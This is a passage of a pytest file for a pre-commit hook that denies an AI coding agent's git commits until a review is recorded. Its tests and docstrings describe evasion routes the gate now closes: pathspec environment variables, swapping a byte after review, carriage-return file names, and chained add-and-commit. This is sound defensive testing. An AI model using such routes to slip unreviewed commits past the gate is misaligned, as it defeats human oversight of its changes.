        GIT_LITERAL_PATHSPECS=1 must make the real dispatcher deny, matching
        HEAD's behavior (this hook never touched the git-subprocess
        environment to begin with) -- not silently allow, which is what the
        fix-round-3 stripping attempt regressed to."""
        os.environ["GIT_LITERAL_PATHSPECS"] = "1"
        cmd = 'git commit -m "x" -- a.py'
        ev = make_payload(tool_name="Bash", command=cmd, cwd=str(repo))
        block, _detail = ptb.resolve_block(ev, cmd, str(repo))
        assert block is not None
        assert block.hook == prg.HOOK_NAME
        assert block.reason == prg.REASON_PATHSPEC_ENV_SET


# ---------------------------------------------------------------------------
# GH #5886 fix-round-4 (non-blocking, cold review): mutation-gap coverage --
# disabling the ≤12-path exact-equality check (record_review.py's B2 fix) or
# removing the env handling (this module's R6-B2 fix) must each make a
# dedicated test go RED, not leave the whole suite silently green. These
# tests exercise the LIVE module under test (whatever `prg`/`rr` this file
# was loaded against), so they are meaningful mutation coverage only when
# actually re-run against a mutated copy -- see the fix-round-4 report for
# the RED verification against a hand-mutated scratch copy.
# ---------------------------------------------------------------------------


def test_mutation_gap_env_var_handling_is_load_bearing(sandbox, repo, make_payload):
    """If `_PATHSPEC_ENV_VARS`/`pathspec_env_vars_present`/the `decide()`
    wiring were removed entirely, this test would go RED: a GIT_*_PATHSPECS
    var present in the environment must deny, not silently allow."""
    os.environ["GIT_ICASE_PATHSPECS"] = "1"
    try:
        cmd = 'git commit -m "x" -- a.py'
        ev = make_payload(tool_name="Bash", command=cmd, cwd=str(repo))
        block, _detail = ptb.resolve_block(ev, cmd, str(repo))
        assert block is not None, (
            "an ambient GIT_ICASE_PATHSPECS=1 must deny -- the env-var handling "
            "is load-bearing, not decorative"
        )
        assert block.reason == prg.REASON_PATHSPEC_ENV_SET
    finally:
        os.environ.pop("GIT_ICASE_PATHSPECS", None)


# ---------------------------------------------------------------------------
# GH #5923: undecodable content is not a git error
# ---------------------------------------------------------------------------


def _old_text_mode_key(repo_path, paths):
    """The key as the gate derived it before #5923: text=True git output."""
    root = _toplevel(repo_path)
    ordered = prg.normalize_paths(root, str(repo_path), list(paths))
    text = subprocess.run(
        ["git", "-C", root, "diff", "HEAD", "--", *ordered],
        capture_output=True,
        text=True,
        timeout=30,
        check=True,
    ).stdout
    return prg.PRECOMMIT_PREFIX + prg.digest_of(text + prg._untracked_material(root, ordered))


def test_non_utf8_diff_is_blocked_as_unreviewed_not_waved_through(sandbox, repo):
    """One Latin-1 byte used to make pending_key return None ("git failed"),
    which the gate reads as degrade-open: the commit landed unreviewed."""
    (repo / "a.py").write_bytes(b"value = '\xe9'\n")
    key = prg.pending_key(_toplevel(repo), str(repo), ["a.py"])
    assert key not in (None, prg.UNRESOLVABLE)
    block, reason, _ = prg.decide(_toplevel(repo), str(repo), ["a.py"])
    assert block is True
    assert reason == prg.REASON_UNREVIEWED


def test_non_utf8_diff_is_cleared_by_recording_a_review(sandbox, repo):
    """Recovery pair: record_review derives the same key through
    prg.pending_key, so recording a review clears the non-UTF-8 commit."""
    (repo / "a.py").write_bytes(b"value = '\xe9'\n")
    assert prg.decide(_toplevel(repo), str(repo), ["a.py"])[:2] == (True, prg.REASON_UNREVIEWED)
    assert _record(repo, "--clean", "--paths", "a.py") == 0
    assert prg.decide(_toplevel(repo), str(repo), ["a.py"])[0] is False


def test_non_utf8_key_moves_when_only_the_undecodable_byte_changes(sandbox, repo):
    """Both bytes replacement-decode to the same text; the raw-byte digest is
    what keeps "review once, then swap the byte" from reusing the review."""
    root = _toplevel(repo)
    (repo / "a.py").write_bytes(b"value = '\xe9'\n")
    first = prg.pending_key(root, str(repo), ["a.py"])
    (repo / "a.py").write_bytes(b"value = '\xe8'\n")
    second = prg.pending_key(root, str(repo), ["a.py"])
    assert first not in (None, prg.UNRESOLVABLE)
    assert second not in (None, prg.UNRESOLVABLE)
    assert first != second


def test_utf16_without_bom_is_keyed_and_content_sensitive(sandbox, repo):
    """BOM-less UTF-16 carries NUL bytes, so git shows it as binary. It must
    still get a key (denied until reviewed), and a content change must move it."""
    root = _toplevel(repo)
    (repo / "a.py").write_bytes("value = 2\n".encode("utf-16-le"))
    first = prg.pending_key(root, str(repo), ["a.py"])
    assert first not in (None, prg.UNRESOLVABLE)
    assert prg.decide(root, str(repo), ["a.py"])[:2] == (True, prg.REASON_UNREVIEWED)
    (repo / "a.py").write_bytes("value = 3\n".encode("utf-16-le"))
    assert prg.pending_key(root, str(repo), ["a.py"]) != first


def test_utf8_keys_are_unchanged_by_the_bytes_reader(sandbox, repo):
    """Every ledger key recorded before #5923 must still match: valid UTF-8,
    including non-ASCII text and CRLF line endings, keys exactly as text=True did."""
    (repo / "a.py").write_bytes("value = 'é'\r\nnext = 2\r\n".encode("utf-8"))
    assert prg.pending_key(_toplevel(repo), str(repo), ["a.py"]) == _old_text_mode_key(repo, ["a.py"])
    (repo / "a.py").write_text("value = 2\n")
    assert prg.pending_key(_toplevel(repo), str(repo), ["a.py"]) == _old_text_mode_key(repo, ["a.py"])


class _FailedRun:
    returncode = 128
    stdout = b""


@pytest.mark.parametrize(
    "failure",
    [
        pytest.param(lambda *a, **k: _FailedRun(), id="nonzero-exit"),
        pytest.param(
            lambda *a, **k: (_ for _ in ()).throw(subprocess.TimeoutExpired(cmd="git", timeout=1)),
            id="timeout",
        ),
    ],
)
def test_real_git_failure_still_degrades_open(sandbox, repo, monkeypatch, failure):
    """The contract is unchanged for a genuine error: a failed or timed-out
    `git diff` means "cannot key", and the gate degrades open (allows)."""
    root = _toplevel(repo)
    ordered = prg.normalize_paths(root, str(repo), ["a.py"])
    monkeypatch.setattr(prg.subprocess, "run", failure)
    assert prg.pending_diff(root, str(repo), ordered) is None
    assert prg.pending_key(root, str(repo), ["a.py"]) is None


def test_untracked_non_utf8_key_moves_when_only_the_invalid_byte_changes(sandbox, repo):
    """GH #5923 B1 (trust review): untracked content was replacement-decoded
    with no raw-byte hash, so review once and swap the byte kept the key."""
    root = _toplevel(repo)
    (repo / "u.py").write_bytes(b"v = '\xe9'\n")
    first = prg.pending_key(root, str(repo), ["u.py"])
    (repo / "u.py").write_bytes(b"v = '\xe8'\n")
    second = prg.pending_key(root, str(repo), ["u.py"])
    assert first not in (None, prg.UNRESOLVABLE)
    assert second not in (None, prg.UNRESOLVABLE)
    assert first != second


@pytest.mark.parametrize(
    "first,second",
    [
        pytest.param(b"v = 'A'\n", b"v = 'B'\n", id="utf8-control"),
        pytest.param(b"v = '\xe9'\n", b"v = '\xe8'\n", id="latin1-byte-swap"),
    ],
)
def test_reviewed_untracked_file_swapped_then_added_is_re_gated(sandbox, make_payload, repo, first, second):
    """Dispatcher level (the trust review's probe): review an untracked file,
    change it, then `git add && git commit -- it`. The whole chain must deny."""
    (repo / "u.py").write_bytes(first)
    assert _record(repo, "--clean", "--paths", "u.py") == 0
    (repo / "u.py").write_bytes(second)
    cmd = 'git add u.py && git commit -m "x" -- u.py'
    ev = make_payload(tool_name="Bash", command=cmd, cwd=str(repo))
    block, _ = ptb.resolve_block(ev, cmd, str(repo))
    assert block is not None and block.hook == prg.HOOK_NAME, "changed content was not re-gated"


def test_cr_named_untracked_file_key_moves_with_its_content(sandbox, repo):
    """GH #5923 B2 (trust review round 2): a text-mode listing turned the CR in
    `pkg/a\\rb.py` into LF, open() failed, and the file rendered <unreadable>
    whatever its content, so editing it after a review kept the key."""
    root = _toplevel(repo)
    (repo / "pkg").mkdir()
    f = repo / "pkg" / "a\rb.py"
    f.write_text("v = 1\n")
    first = prg.pending_key(root, str(repo), ["pkg"])
    f.write_text("v = 2\n")
    second = prg.pending_key(root, str(repo), ["pkg"])
    assert first not in (None, prg.UNRESOLVABLE)
    assert first != second


def test_reviewed_cr_named_untracked_file_edited_then_added_is_re_gated(sandbox, make_payload, repo):
    """Dispatcher level: the hook sees `git add pkg && git commit -- pkg` while
    the file is still untracked, so the untracked listing is what keys it."""
    (repo / "pkg").mkdir()
    f = repo / "pkg" / "a\rb.py"
    f.write_text("v = 1\n")
    assert _record(repo, "--clean", "--paths", "pkg") == 0
    f.write_text("v = 2\n")
    cmd = 'git add pkg && git commit -m "x" -- pkg'
    ev = make_payload(tool_name="Bash", command=cmd, cwd=str(repo))
    block, _ = ptb.resolve_block(ev, cmd, str(repo))
    assert block is not None and block.hook == prg.HOOK_NAME, "edited content was not re-gated"


def test_rekey_matches_with_a_tracked_non_utf8_edit_alongside(sandbox, repo):
    """GH #5923 M5: the rekey reconstruction reads the tracked half through the
    same bytes-safe reader as pending_diff, so a tracked Latin-1 edit alongside
    a reviewed-then-staged new file still carries the review forward."""
    root = _toplevel(repo)
    (repo / "a.py").write_bytes(b"value = '\xe9'\n")
    (repo / "new_module.py").write_text("def thing():\n    return 1\n")
    paths = ["a.py", "new_module.py"]
    prior_key = prg.pending_key(root, str(repo), paths)
    assert prior_key not in (None, prg.UNRESOLVABLE)
    prior_digest_hex = prior_key[len(prg.PRECOMMIT_PREFIX):]
    _git(repo, "add", "new_module.py")
    current_key = prg.pending_key(root, str(repo), paths)
    assert current_key != prior_key
    assert prg.rekey_digest_if_only_untracked_became_staged(root, str(repo), paths, prior_digest_hex) == current_key


def test_surrogate_bearing_untracked_names_render_distinctly():
    """GH #5923 L7/L10: names os.fsdecode'd from non-UTF-8 bytes carry lone
    surrogates. Rendered raw, digest_of's "replace" encode would collapse
    bad\\xe9.py, bad\\xe8.py and a literal bad?.py to one header."""
    rendered = {prg._digest_safe_name(n) for n in ("bad\udce9.py", "bad\udce8.py", "bad?.py")}
    assert len(rendered) == 3
    assert len({prg.digest_of(r) for r in rendered}) == 3
    assert prg._digest_safe_name("ordinary_name.py") == "ordinary_name.py"


# --- reviewer of record in the denial text (auto-invocation design, 2026-09-28) ---
# Spec: a repo's .claude/oversight/manifest.json may list security.trust_surface_globs;
# an unreviewed commit touching one must name trust-architect (it substitutes for
# code-reviewer, CLAUDE.md §10/§13); anything else, or no/unreadable manifest, names
# the code-reviewer as before.

def _manifest_repo(tmp_path, globs):
    repo = tmp_path / "repo"
    (repo / ".claude" / "oversight").mkdir(parents=True)
    (repo / ".claude" / "oversight" / "manifest.json").write_text(
        json.dumps({"security": {"trust_surface_globs": globs}}), encoding="utf-8")
    return repo


def test_denial_names_trust_architect_for_trust_surface_path(tmp_path):
    repo = _manifest_repo(tmp_path, ["modules/billing/*", "firestore.rules"])
    msg = prg.message_for(prg.REASON_UNREVIEWED, {}, ["modules/billing/stripe.py"], str(repo))
    assert "trust-architect" in msg
    assert "code-reviewer over these paths" not in msg


def test_denial_names_code_reviewer_for_other_paths(tmp_path):
    repo = _manifest_repo(tmp_path, ["modules/billing/*"])
    msg = prg.message_for(prg.REASON_UNREVIEWED, {}, ["docs/readme.md"], str(repo))
    assert "Opus code-reviewer over these paths" in msg
    assert "trust-architect" not in msg


def test_denial_fails_open_without_manifest(tmp_path):
    msg = prg.message_for(prg.REASON_UNREVIEWED, {}, ["modules/billing/stripe.py"], str(tmp_path))
    assert "Opus code-reviewer over these paths" in msg


def test_denial_dot_prefixed_repo_path_matches(tmp_path):
    repo = _manifest_repo(tmp_path, [".claude/hooks/*"])
    msg = prg.message_for(prg.REASON_UNREVIEWED, {}, ["./.claude/hooks/x.py"], str(repo))
    assert "trust-architect" in msg


def test_denial_directory_pathspec_matches_trust_glob(tmp_path):
    repo = _manifest_repo(tmp_path, ["modules/billing/*"])
    msg = prg.message_for(prg.REASON_UNREVIEWED, {}, ["modules/billing"], str(repo))
    assert "trust-architect" in msg


def test_denial_reads_standalone_trust_surface_file(tmp_path):
    repo = tmp_path / "repo2"
    (repo / ".claude" / "oversight").mkdir(parents=True)
    (repo / ".claude" / "oversight" / "trust_surface.json").write_text(
        json.dumps({"trust_surface_globs": ["modules/auth/*"]}), encoding="utf-8")
    msg = prg.message_for(prg.REASON_UNREVIEWED, {}, ["modules/auth/login.py"], str(repo))
    assert "trust-architect" in msg


def test_denial_malformed_standalone_falls_through_to_manifest(tmp_path):
    repo = _manifest_repo(tmp_path, ["modules/billing/*"])
    (repo / ".claude" / "oversight" / "trust_surface.json").write_text("{bad", encoding="utf-8")
    msg = prg.message_for(prg.REASON_UNREVIEWED, {}, ["modules/billing/x.py"], str(repo))
    assert "trust-architect" in msg


def test_denial_merges_both_sources(tmp_path):
    repo = _manifest_repo(tmp_path, ["modules/billing/*"])
    (repo / ".claude" / "oversight" / "trust_surface.json").write_text(
        json.dumps({"trust_surface_globs": ["modules/auth/*"]}), encoding="utf-8")
    assert "trust-architect" in prg.message_for(prg.REASON_UNREVIEWED, {}, ["modules/billing/x.py"], str(repo))
    assert "trust-architect" in prg.message_for(prg.REASON_UNREVIEWED, {}, ["modules/auth/x.py"], str(repo))
